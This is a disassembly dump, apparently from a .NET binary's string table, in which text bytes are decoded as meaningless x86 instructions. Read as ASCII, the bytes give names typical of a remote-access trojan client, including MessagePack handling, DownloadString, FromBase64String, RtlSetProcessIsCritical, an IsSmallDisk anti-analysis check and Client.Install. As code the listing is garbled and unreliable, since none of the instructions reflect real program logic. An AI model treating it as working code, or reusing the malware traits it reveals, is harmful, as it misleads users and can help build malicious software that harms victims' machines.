  4081c0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c6:	74 69                	je     0x408231
  4081c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ca:	41                   	inc    %ecx
  4081cb:	74 74                	je     0x408241
  4081cd:	72 69                	jb     0x408238
  4081cf:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d6:	73 65                	jae    0x40823d
  4081d8:	6d                   	insl   (%dx),%es:(%edi)
  4081d9:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081dd:	65 73 63             	gs jae 0x408243
  4081e0:	72 69                	jb     0x40824b
  4081e2:	70 74                	jo     0x408258
  4081e4:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081eb:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f2:	65 66 61             	gs popaw
  4081f5:	75 6c                	jne    0x408263
  4081f7:	74 4d                	je     0x408246
  4081f9:	65 6d                	gs insl (%dx),%es:(%edi)
  4081fb:	62 65 72             	bound  %esp,0x72(%ebp)
  4081fe:	41                   	inc    %ecx
  4081ff:	74 74                	je     0x408275
  408201:	72 69                	jb     0x40826c
  408203:	62 75 74             	bound  %esi,0x74(%ebp)
  408206:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820a:	6d                   	insl   (%dx),%es:(%edi)
  40820b:	70 69                	jo     0x408276
  40820d:	6c                   	insb   (%dx),%es:(%edi)
  40820e:	61                   	popa
  40820f:	74 69                	je     0x40827a
  408211:	6f                   	outsl  %ds:(%esi),(%dx)
  408212:	6e                   	outsb  %ds:(%esi),(%dx)
  408213:	52                   	push   %edx
  408214:	65 6c                	gs insb (%dx),%es:(%edi)
  408216:	61                   	popa
  408217:	78 61                	js     0x40827a
  408219:	74 69                	je     0x408284
  40821b:	6f                   	outsl  %ds:(%esi),(%dx)
  40821c:	6e                   	outsb  %ds:(%esi),(%dx)
  40821d:	73 41                	jae    0x408260
  40821f:	74 74                	je     0x408295
  408221:	72 69                	jb     0x40828c
  408223:	62 75 74             	bound  %esi,0x74(%ebp)
  408226:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822a:	73 65                	jae    0x408291
  40822c:	6d                   	insl   (%dx),%es:(%edi)
  40822d:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408231:	72 6f                	jb     0x4082a2
  408233:	64 75 63             	fs jne 0x408299
  408236:	74 41                	je     0x408279
  408238:	74 74                	je     0x4082ae
  40823a:	72 69                	jb     0x4082a5
  40823c:	62 75 74             	bound  %esi,0x74(%ebp)
  40823f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408243:	73 65                	jae    0x4082aa
  408245:	6d                   	insl   (%dx),%es:(%edi)
  408246:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824a:	6f                   	outsl  %ds:(%esi),(%dx)
  40824b:	70 79                	jo     0x4082c6
  40824d:	72 69                	jb     0x4082b8
  40824f:	67 68 74 41 74 74    	addr16 push $0x74744174
  408255:	72 69                	jb     0x4082c0
  408257:	62 75 74             	bound  %esi,0x74(%ebp)
  40825a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40825e:	73 65                	jae    0x4082c5
  408260:	6d                   	insl   (%dx),%es:(%edi)
  408261:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408265:	6f                   	outsl  %ds:(%esi),(%dx)
  408266:	6d                   	insl   (%dx),%es:(%edi)
  408267:	70 61                	jo     0x4082ca
  408269:	6e                   	outsb  %ds:(%esi),(%dx)
  40826a:	79 41                	jns    0x4082ad
  40826c:	74 74                	je     0x4082e2
  40826e:	72 69                	jb     0x4082d9
  408270:	62 75 74             	bound  %esi,0x74(%ebp)
  408273:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408277:	6e                   	outsb  %ds:(%esi),(%dx)
  408278:	74 69                	je     0x4082e3
  40827a:	6d                   	insl   (%dx),%es:(%edi)
  40827b:	65 43                	gs inc %ebx
  40827d:	6f                   	outsl  %ds:(%esi),(%dx)
  40827e:	6d                   	insl   (%dx),%es:(%edi)
  40827f:	70 61                	jo     0x4082e2
  408281:	74 69                	je     0x4082ec
  408283:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408286:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40828d:	69 
  40828e:	62 75 74             	bound  %esi,0x74(%ebp)
  408291:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408295:	74 5f                	je     0x4082f6
  408297:	55                   	push   %ebp
  408298:	73 65                	jae    0x4082ff
  40829a:	53                   	push   %ebx
  40829b:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a0:	78 65                	js     0x408307
  4082a2:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a5:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082a9:	61                   	popa
  4082aa:	64 42                	fs inc %edx
  4082ac:	79 74                	jns    0x408322
  4082ae:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b2:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082b9:	00 
  4082ba:	44                   	inc    %esp
  4082bb:	65 6c                	gs insb (%dx),%es:(%edi)
  4082bd:	65 74 65             	gs je  0x408325
  4082c0:	56                   	push   %esi
  4082c1:	61                   	popa
  4082c2:	6c                   	insb   (%dx),%es:(%edi)
  4082c3:	75 65                	jne    0x40832a
  4082c5:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c9:	65 72 56             	gs jb  0x408322
  4082cc:	61                   	popa
  4082cd:	6c                   	insb   (%dx),%es:(%edi)
  4082ce:	75 65                	jne    0x408335
  4082d0:	00 47 65             	add    %al,0x65(%edi)
  4082d3:	74 56                	je     0x40832b
  4082d5:	61                   	popa
  4082d6:	6c                   	insb   (%dx),%es:(%edi)
  4082d7:	75 65                	jne    0x40833e
  4082d9:	00 53 65             	add    %dl,0x65(%ebx)
  4082dc:	74 56                	je     0x408334
  4082de:	61                   	popa
  4082df:	6c                   	insb   (%dx),%es:(%edi)
  4082e0:	75 65                	jne    0x408347
  4082e2:	00 76 61             	add    %dh,0x61(%esi)
  4082e5:	6c                   	insb   (%dx),%es:(%edi)
  4082e6:	75 65                	jne    0x40834d
  4082e8:	00 67 65             	add    %ah,0x65(%edi)
  4082eb:	74 5f                	je     0x40834c
  4082ed:	4b                   	dec    %ebx
  4082ee:	65 65 70 41          	gs gs jo 0x408333
  4082f2:	6c                   	insb   (%dx),%es:(%edi)
  4082f3:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fa:	5f                   	pop    %edi
  4082fb:	4b                   	dec    %ebx
  4082fc:	65 65 70 41          	gs gs jo 0x408341
  408300:	6c                   	insb   (%dx),%es:(%edi)
  408301:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408308:	6f                   	outsl  %ds:(%esi),(%dx)
  408309:	76 65                	jbe    0x408370
  40830b:	00 41 70             	add    %al,0x70(%ecx)
  40830e:	70 6c                	jo     0x40837c
  408310:	65 2e 65 78 65       	gs cs js,pn 0x40837a
  408315:	00 73 65             	add    %dh,0x65(%ebx)
  408318:	74 5f                	je     0x408379
  40831a:	42                   	inc    %edx
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	6f                   	outsl  %ds:(%esi),(%dx)
  40831d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408320:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408327:	5f                   	pop    %edi
  408328:	54                   	push   %esp
  408329:	6f                   	outsl  %ds:(%esi),(%dx)
  40832a:	74 61                	je     0x40838d
  40832c:	6c                   	insb   (%dx),%es:(%edi)
  40832d:	53                   	push   %ebx
  40832e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408335:	5f                   	pop    %edi
  408336:	48                   	dec    %eax
  408337:	65 61                	gs popa
  408339:	64 65 72 53          	fs gs jb 0x408390
  40833d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408344:	5f                   	pop    %edi
  408345:	48                   	dec    %eax
  408346:	65 61                	gs popa
  408348:	64 65 72 53          	fs gs jb 0x40839f
  40834c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408353:	5f                   	pop    %edi
  408354:	53                   	push   %ebx
  408355:	65 6e                	outsb  %gs:(%esi),(%dx)
  408357:	64 42                	fs inc %edx
  408359:	75 66                	jne    0x4083c1
  40835b:	66 65 72 53          	data16 gs jb 0x4083b2
  40835f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408366:	5f                   	pop    %edi
  408367:	52                   	push   %edx
  408368:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40836c:	76 65                	jbe    0x4083d3
  40836e:	42                   	inc    %edx
  40836f:	75 66                	jne    0x4083d7
  408371:	66 65 72 53          	data16 gs jb 0x4083c8
  408375:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40837c:	5f                   	pop    %edi
  40837d:	4b                   	dec    %ebx
  40837e:	65 79 53             	gs jns 0x4083d4
  408381:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408388:	65 78 4f             	gs js  0x4083da
  40838b:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40838f:	72 46                	jb     0x4083d7
  408391:	6c                   	insb   (%dx),%es:(%edi)
  408392:	61                   	popa
  408393:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408397:	79 70                	jns    0x408409
  408399:	74 6f                	je     0x40840a
  40839b:	43                   	inc    %ebx
  40839c:	6f                   	outsl  %ds:(%esi),(%dx)
  40839d:	6e                   	outsb  %ds:(%esi),(%dx)
  40839e:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a4:	74 5f                	je     0x408405
  4083a6:	50                   	push   %eax
  4083a7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ae:	5f                   	pop    %edi
  4083af:	50                   	push   %eax
  4083b0:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083b7:	74 65                	je     0x40841e
  4083b9:	6d                   	insl   (%dx),%es:(%edi)
  4083ba:	2e 54                	cs push %esp
  4083bc:	68 72 65 61 64       	push   $0x64616572
  4083c1:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083c8:	5f                   	pop    %edi
  4083c9:	50                   	push   %eax
  4083ca:	61                   	popa
  4083cb:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d2:	64 64 
  4083d4:	5f                   	pop    %edi
  4083d5:	53                   	push   %ebx
  4083d6:	65 73 73             	gs jae 0x40844c
  4083d9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e1:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e5:	73 74                	jae    0x40845b
  4083e7:	65 6d                	gs insl (%dx),%es:(%edi)
  4083e9:	45                   	inc    %ebp
  4083ea:	76 65                	jbe    0x408451
  4083ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ed:	74 73                	je     0x408462
  4083ef:	5f                   	pop    %edi
  4083f0:	53                   	push   %ebx
  4083f1:	65 73 73             	gs jae 0x408467
  4083f4:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fc:	67 00 55 54          	add    %dl,0x54(%di)
  408400:	46                   	inc    %esi
  408401:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408404:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408407:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40840e:	74 65                	je     0x408475
  408410:	6d                   	insl   (%dx),%es:(%edi)
  408411:	2e 44                	cs inc %esp
  408413:	72 61                	jb     0x408476
  408415:	77 69                	ja     0x408480
  408417:	6e                   	outsb  %ds:(%esi),(%dx)
  408418:	67 2e 49             	addr16 cs dec %ecx
  40841b:	6d                   	insl   (%dx),%es:(%edi)
  40841c:	61                   	popa
  40841d:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408424:	73 
  408425:	74 65                	je     0x40848c
  408427:	6d                   	insl   (%dx),%es:(%edi)
  408428:	2e 52                	cs push %edx
  40842a:	75 6e                	jne    0x40849a
  40842c:	74 69                	je     0x408497
  40842e:	6d                   	insl   (%dx),%es:(%edi)
  40842f:	65 2e 56             	gs cs push %esi
  408432:	65 72 73             	gs jb  0x4084a8
  408435:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40843c:	46                   	inc    %esi
  40843d:	72 6f                	jb     0x4084ae
  40843f:	6d                   	insl   (%dx),%es:(%edi)
  408440:	42                   	inc    %edx
  408441:	61                   	popa
  408442:	73 65                	jae    0x4084a9
  408444:	36 34 53             	ss xor $0x53,%al
  408447:	74 72                	je     0x4084bb
  408449:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408450:	61                   	popa
  408451:	73 65                	jae    0x4084b8
  408453:	36 34 53             	ss xor $0x53,%al
  408456:	74 72                	je     0x4084ca
  408458:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40845f:	64 53                	fs push %ebx
  408461:	74 72                	je     0x4084d5
  408463:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846a:	6e                   	outsb  %ds:(%esi),(%dx)
  40846b:	6c                   	insb   (%dx),%es:(%edi)
  40846c:	6f                   	outsl  %ds:(%esi),(%dx)
  40846d:	61                   	popa
  40846e:	64 53                	fs push %ebx
  408470:	74 72                	je     0x4084e4
  408472:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408479:	74 65                	je     0x4084e0
  40847b:	53                   	push   %ebx
  40847c:	74 72                	je     0x4084f0
  40847e:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408485:	74 72                	je     0x4084f9
  408487:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40848e:	5f                   	pop    %edi
  40848f:	41                   	inc    %ecx
  408490:	73 53                	jae    0x4084e5
  408492:	74 72                	je     0x408506
  408494:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40849b:	5f                   	pop    %edi
  40849c:	41                   	inc    %ecx
  40849d:	73 53                	jae    0x4084f2
  40849f:	74 72                	je     0x408513
  4084a1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084a8:	65 73 41             	gs jae 0x4084ec
  4084ab:	73 53                	jae    0x408500
  4084ad:	74 72                	je     0x408521
  4084af:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b6:	41                   	inc    %ecx
  4084b7:	73 53                	jae    0x40850c
  4084b9:	74 72                	je     0x40852d
  4084bb:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c2:	41                   	inc    %ecx
  4084c3:	73 53                	jae    0x408518
  4084c5:	74 72                	je     0x408539
  4084c7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084ce:	53                   	push   %ebx
  4084cf:	74 72                	je     0x408543
  4084d1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084d8:	65 73 41             	gs jae 0x40851c
  4084db:	73 48                	jae    0x408525
  4084dd:	65 78 53             	gs js  0x408533
  4084e0:	74 72                	je     0x408554
  4084e2:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084e9:	73 74                	jae    0x40855f
  4084eb:	72 69                	jb     0x408556
  4084ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ee:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f2:	73 74                	jae    0x408568
  4084f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f6:	2e 44                	cs inc %esp
  4084f8:	72 61                	jb     0x40855b
  4084fa:	77 69                	ja     0x408565
  4084fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fd:	67 00 67 65          	add    %ah,0x65(%bx)
  408501:	74 5f                	je     0x408562
  408503:	41                   	inc    %ecx
  408504:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408508:	61                   	popa
  408509:	74 65                	je     0x408570
  40850b:	50                   	push   %eax
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	6e                   	outsb  %ds:(%esi),(%dx)
  40850e:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408512:	74 5f                	je     0x408573
  408514:	41                   	inc    %ecx
  408515:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408519:	61                   	popa
  40851a:	74 65                	je     0x408581
  40851c:	50                   	push   %eax
  40851d:	6f                   	outsl  %ds:(%esi),(%dx)
  40851e:	6e                   	outsb  %ds:(%esi),(%dx)
  40851f:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408523:	74 5f                	je     0x408584
  408525:	45                   	inc    %ebp
  408526:	72 72                	jb     0x40859a
  408528:	6f                   	outsl  %ds:(%esi),(%dx)
  408529:	72 44                	jb     0x40856f
  40852b:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408532:	73 67                	jae    0x40859b
  408534:	00 43 6f             	add    %al,0x6f(%ebx)
  408537:	6d                   	insl   (%dx),%es:(%edi)
  408538:	70 75                	jo     0x4085af
  40853a:	74 65                	je     0x4085a1
  40853c:	48                   	dec    %eax
  40853d:	61                   	popa
  40853e:	73 68                	jae    0x4085a8
  408540:	00 73 74             	add    %dh,0x74(%ebx)
  408543:	72 54                	jb     0x408599
  408545:	6f                   	outsl  %ds:(%esi),(%dx)
  408546:	48                   	dec    %eax
  408547:	61                   	popa
  408548:	73 68                	jae    0x4085b2
  40854a:	00 47 65             	add    %al,0x65(%edi)
  40854d:	74 48                	je     0x408597
  40854f:	61                   	popa
  408550:	73 68                	jae    0x4085ba
  408552:	00 56 65             	add    %dl,0x65(%esi)
  408555:	72 69                	jb     0x4085c0
  408557:	66 79 48             	data16 jns 0x4085a2
  40855a:	61                   	popa
  40855b:	73 68                	jae    0x4085c5
  40855d:	00 46 6c             	add    %al,0x6c(%esi)
  408560:	75 73                	jne    0x4085d5
  408562:	68 00 67 65 74       	push   $0x74656700
  408567:	5f                   	pop    %edi
  408568:	45                   	inc    %ebp
  408569:	78 65                	js     0x4085d0
  40856b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40856e:	61                   	popa
  40856f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408573:	61                   	popa
  408574:	74 68                	je     0x4085de
  408576:	00 47 65             	add    %al,0x65(%edi)
  408579:	74 54                	je     0x4085cf
  40857b:	65 6d                	gs insl (%dx),%es:(%edi)
  40857d:	70 50                	jo     0x4085cf
  40857f:	61                   	popa
  408580:	74 68                	je     0x4085ea
  408582:	00 70 61             	add    %dh,0x61(%eax)
  408585:	74 68                	je     0x4085ef
  408587:	00 48 6d             	add    %cl,0x6d(%eax)
  40858a:	61                   	popa
  40858b:	63 53 68             	arpl   %edx,0x68(%ebx)
  40858e:	61                   	popa
  40858f:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408595:	67 74 68             	addr16 je 0x408600
  408598:	00 67 65             	add    %ah,0x65(%edi)
  40859b:	74 5f                	je     0x4085fc
  40859d:	4c                   	dec    %esp
  40859e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a0:	67 74 68             	addr16 je 0x40860b
  4085a3:	00 49 76             	add    %cl,0x76(%ecx)
  4085a6:	4c                   	dec    %esp
  4085a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a9:	67 74 68             	addr16 je 0x408614
  4085ac:	00 41 75             	add    %al,0x75(%ecx)
  4085af:	74 68                	je     0x408619
  4085b1:	4b                   	dec    %ebx
  4085b2:	65 79 4c             	gs jns 0x408601
  4085b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b7:	67 74 68             	addr16 je 0x408622
  4085ba:	00 55 72             	add    %dl,0x72(%ebp)
  4085bd:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c3:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c6:	67 70 61             	addr16 jo 0x40862a
  4085c9:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085cc:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085cf:	6c                   	insb   (%dx),%es:(%edi)
  4085d0:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d8:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085db:	4d                   	dec    %ebp
  4085dc:	65 73 73             	gs jae 0x408652
  4085df:	61                   	popa
  4085e0:	67 65 50             	addr16 gs push %eax
  4085e3:	61                   	popa
  4085e4:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085e7:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085ee:	61                   	popa
  4085ef:	67 65 50             	addr16 gs push %eax
  4085f2:	61                   	popa
  4085f3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f6:	4d                   	dec    %ebp
  4085f7:	73 67                	jae    0x408660
  4085f9:	50                   	push   %eax
  4085fa:	61                   	popa
  4085fb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fe:	41                   	inc    %ecx
  4085ff:	73 79                	jae    0x40867a
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	63 43 61             	arpl   %eax,0x61(%ebx)
  408605:	6c                   	insb   (%dx),%es:(%edi)
  408606:	6c                   	insb   (%dx),%es:(%edi)
  408607:	62 61 63             	bound  %esp,0x63(%ecx)
  40860a:	6b 00 52             	imul   $0x52,(%eax),%eax
  40860d:	65 6d                	gs insl (%dx),%es:(%edi)
  40860f:	6f                   	outsl  %ds:(%esi),(%dx)
  408610:	74 65                	je     0x408677
  408612:	43                   	inc    %ebx
  408613:	65 72 74             	gs jb  0x40868a
  408616:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40861d:	56                   	push   %esi
  40861e:	61                   	popa
  40861f:	6c                   	insb   (%dx),%es:(%edi)
  408620:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408627:	43 
  408628:	61                   	popa
  408629:	6c                   	insb   (%dx),%es:(%edi)
  40862a:	6c                   	insb   (%dx),%es:(%edi)
  40862b:	62 61 63             	bound  %esp,0x63(%ecx)
  40862e:	6b 00 54             	imul   $0x54,(%eax),%eax
  408631:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408638:	6c                   	insb   (%dx),%es:(%edi)
  408639:	62 61 63             	bound  %esp,0x63(%ecx)
  40863c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40863f:	6e                   	outsb  %ds:(%esi),(%dx)
  408640:	70 61                	jo     0x4086a3
  408642:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408645:	6d                   	insl   (%dx),%es:(%edi)
  408646:	73 67                	jae    0x4086af
  408648:	70 61                	jo     0x4086ab
  40864a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40864d:	52                   	push   %edx
  40864e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408655:	4b 65 
  408657:	79 50                	jns    0x4086a9
  408659:	65 72 6d             	gs jb  0x4086c9
  40865c:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408663:	68 65 63 6b 00       	push   $0x6b6365
  408668:	46                   	inc    %esi
  408669:	6c                   	insb   (%dx),%es:(%edi)
  40866a:	75 73                	jne    0x4086df
  40866c:	68 46 69 6e 61       	push   $0x616e6946
  408671:	6c                   	insb   (%dx),%es:(%edi)
  408672:	42                   	inc    %edx
  408673:	6c                   	insb   (%dx),%es:(%edi)
  408674:	6f                   	outsl  %ds:(%esi),(%dx)
  408675:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408678:	49                   	dec    %ecx
  408679:	73 53                	jae    0x4086ce
  40867b:	6d                   	insl   (%dx),%es:(%edi)
  40867c:	61                   	popa
  40867d:	6c                   	insb   (%dx),%es:(%edi)
  40867e:	6c                   	insb   (%dx),%es:(%edi)
  40867f:	44                   	inc    %esp
  408680:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408687:	6c                   	insb   (%dx),%es:(%edi)
  408688:	00 66 56             	add    %ah,0x56(%esi)
  40868b:	61                   	popa
  40868c:	6c                   	insb   (%dx),%es:(%edi)
  40868d:	00 69 56             	add    %ch,0x56(%ecx)
  408690:	61                   	popa
  408691:	6c                   	insb   (%dx),%es:(%edi)
  408692:	00 73 74             	add    %dh,0x74(%ebx)
  408695:	72 56                	jb     0x4086ed
  408697:	61                   	popa
  408698:	6c                   	insb   (%dx),%es:(%edi)
  408699:	00 52 74             	add    %dl,0x74(%edx)
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	53                   	push   %ebx
  40869e:	65 74 50             	gs je  0x4086f1
  4086a1:	72 6f                	jb     0x408712
  4086a3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a6:	73 49                	jae    0x4086f1
  4086a8:	73 43                	jae    0x4086ed
  4086aa:	72 69                	jb     0x408715
  4086ac:	74 69                	je     0x408717
  4086ae:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b1:	00 50 72             	add    %dl,0x72(%eax)
  4086b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b8:	73 43                	jae    0x4086fd
  4086ba:	72 69                	jb     0x408725
  4086bc:	74 69                	je     0x408727
  4086be:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c1:	00 4e 65             	add    %cl,0x65(%esi)
  4086c4:	74 77                	je     0x40873d
  4086c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c7:	72 6b                	jb     0x408734
  4086c9:	43                   	inc    %ebx
  4086ca:	72 65                	jb     0x408731
  4086cc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086cf:	74 69                	je     0x40873a
  4086d1:	61                   	popa
  4086d2:	6c                   	insb   (%dx),%es:(%edi)
  4086d3:	00 53 79             	add    %dl,0x79(%ebx)
  4086d6:	73 74                	jae    0x40874c
  4086d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4086da:	2e 53                	cs push %ebx
  4086dc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e0:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086e7:	6e 
  4086e8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086eb:	61                   	popa
  4086ec:	6c                   	insb   (%dx),%es:(%edi)
  4086ed:	00 57 69             	add    %dl,0x69(%edi)
  4086f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f1:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f3:	77 73                	ja     0x408768
  4086f5:	50                   	push   %eax
  4086f6:	72 69                	jb     0x408761
  4086f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f9:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086fc:	61                   	popa
  4086fd:	6c                   	insb   (%dx),%es:(%edi)
  4086fe:	00 41 72             	add    %al,0x72(%ecx)
  408701:	65 45                	gs inc %ebp
  408703:	71 75                	jno    0x40877a
  408705:	61                   	popa
  408706:	6c                   	insb   (%dx),%es:(%edi)
  408707:	00 67 65             	add    %ah,0x65(%edi)
  40870a:	74 5f                	je     0x40876b
  40870c:	49                   	dec    %ecx
  40870d:	6e                   	outsb  %ds:(%esi),(%dx)
  40870e:	74 65                	je     0x408775
  408710:	72 76                	jb     0x408788
  408712:	61                   	popa
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	00 73 65             	add    %dh,0x65(%ebx)
  408717:	74 5f                	je     0x408778
  408719:	49                   	dec    %ecx
  40871a:	6e                   	outsb  %ds:(%esi),(%dx)
  40871b:	74 65                	je     0x408782
  40871d:	72 76                	jb     0x408795
  40871f:	61                   	popa
  408720:	6c                   	insb   (%dx),%es:(%edi)
  408721:	00 43 6c             	add    %al,0x6c(%ebx)
  408724:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40872b:	73 74                	jae    0x4087a1
  40872d:	61                   	popa
  40872e:	6c                   	insb   (%dx),%es:(%edi)
  40872f:	6c                   	insb   (%dx),%es:(%edi)
  408730:	00 6b 65             	add    %ch,0x65(%ebx)
  408733:	72 6e                	jb     0x4087a3
  408735:	65 6c                	gs insb (%dx),%es:(%edi)
  408737:	33 32                	xor    (%edx),%esi
  408739:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40873c:	6c                   	insb   (%dx),%es:(%edi)
  40873d:	00 75 73             	add    %dh,0x73(%ebp)
  408740:	65 72 33             	gs jb  0x408776
